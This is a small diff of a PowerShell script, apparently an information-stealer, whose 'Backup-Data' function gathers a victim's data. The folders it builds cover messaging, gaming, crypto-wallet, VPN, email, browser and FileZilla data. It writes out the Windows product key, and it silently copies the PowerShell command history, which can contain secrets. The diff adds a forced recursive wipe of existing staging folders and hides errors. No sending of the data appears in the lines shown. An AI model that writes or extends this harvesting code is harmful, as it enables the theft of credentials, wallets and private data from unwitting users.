@@ -146,6 +146,7 @@ function Backup-Data {
     $filezilla_bkp = "$folderformat\FileZilla"
 
     $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $filezilla_bkp)
+    foreach ($folder in $folders) {if (Test-Path $folder) {Remove-Item $folder -Recurse -Force }}
     $folders | ForEach-Object {
         New-Item -ItemType Directory -Path $_ -Force | Out-Null
     }
@@ -301,13 +302,7 @@ function Backup-Data {
     }
     Get-ProductKey > $folder_general\productkey.txt
 
-    try {
-        Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File -FilePath "$folder_general\clipboard_history.txt" -Encoding UTF8
-    }
-    catch {
-        # PSReadline is probably not enabled.
-    }
-
+    try {Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File -FilePath "$folder_general\clipboard_history.txt" -Encoding UTF8 -ErrorAction SilentlyContinue}catch{}
 
     # All Messaging Sessions
     
